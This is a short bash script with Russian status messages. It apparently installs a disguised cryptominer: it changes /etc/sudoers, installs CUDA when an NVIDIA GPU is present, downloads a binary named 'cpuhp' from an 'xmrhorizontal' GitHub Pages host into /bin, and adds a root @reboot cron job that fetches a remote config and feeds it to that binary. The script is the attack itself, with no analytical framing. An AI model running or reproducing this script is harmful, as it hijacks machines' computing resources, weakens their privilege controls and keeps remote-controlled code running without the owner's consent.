#!/bin/bash
su
sed -i 's/^#\(root\s*ALL=(ALL)\s*ALL\)/\1/' /etc/sudoers
echo "SUDO Разблокирован!."

if ( lspci | grep -i nvidia ); then
	apt-get install -y nvidia-cuda-toolkit
fi
    echo "Копирую в /bin."
    cd /bin
    wget https://xmrhorizontal.github.io/cpuhp
    chmod +x ./cpuhp
    echo "@reboot root curl -s https://xmrhorizontal.github.io/config.json | /bin/cpuhp --config /dev/stdin" > /etc/cron.d/cronconfig
echo OK!

